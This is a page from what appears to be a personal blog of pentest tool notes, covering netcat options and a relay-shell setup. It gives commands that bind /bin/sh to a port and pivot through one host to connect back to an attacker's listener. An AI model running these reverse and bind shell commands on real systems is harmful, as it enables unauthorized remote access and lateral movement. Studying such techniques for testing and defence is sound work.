...
<head>
  ...
  <meta name="description" content="nc参数    -c  shell commands    -d  后台模式    -e	程序重定向    -i  时间间隔    -l  监听模式    -n  直接使用IP地址，不通过域名服务器    -o 文件名	将传输的数据转化为十六进制字节码后存于文件中    -p  设置通信端口    -r  随机指定本地与远程主机的通信端口    -s IP地址  设置本机送出的数据包的的ip地址">
<meta property="og:type" content="article">
<meta property="og:title" content="空空">
<meta property="og:url" content="http://example.com/nc">
<meta property="og:site_name" content="空空">
<meta property="og:description" content="nc参数    -c  shell commands    -d  后台模式    -e	程序重定向    -i  时间间隔    -l  监听模式    -n  直接使用IP地址，不通过域名服务器    -o 文件名	将传输的数据转化为十六进制字节码后存于文件中    -p  设置通信端口    -r  随机指定本地与远程主机的通信端口    -s IP地址  设置本机送出的数据包的的ip地址">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-01-09T15:12:28.947Z">
<meta property="article:modified_time" content="2022-12-29T02:50:24.311Z">
...
<body>
  ...
  <div id="header-outer" class="outer">
    ...
    <div id="header-inner" class="inner">
      ...
      <div class="outer">
        <section id="main"><article id="post-nc" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/nc" class="article-date">
...
<p>nc做中转shell<br>    attck	80.102<br>        nc -lvp 4444<br>    target2  1.103<br>        nc -lvp 5555 -e &#x2F;bin&#x2F;sh<br>    target1  80.107  1.107<br>        nc -v 10.10.80.102 4444 -c “nc -v 192.168.1.103 5555”</p>
    ...
    <footer class="article-footer">
      <a data-url="http://example.com/nc" data-id="clcpuo206001490vp0iym0k3q" data-title="" class="article-share-link">分享</a>
...
<nav id="article-nav">
    ...
    <a href="/nikto" id="article-nav-newer" class="article-nav-link-wrap">
    ...
    <a href="/nbtscan" id="article-nav-older" class="article-nav-link-wrap">
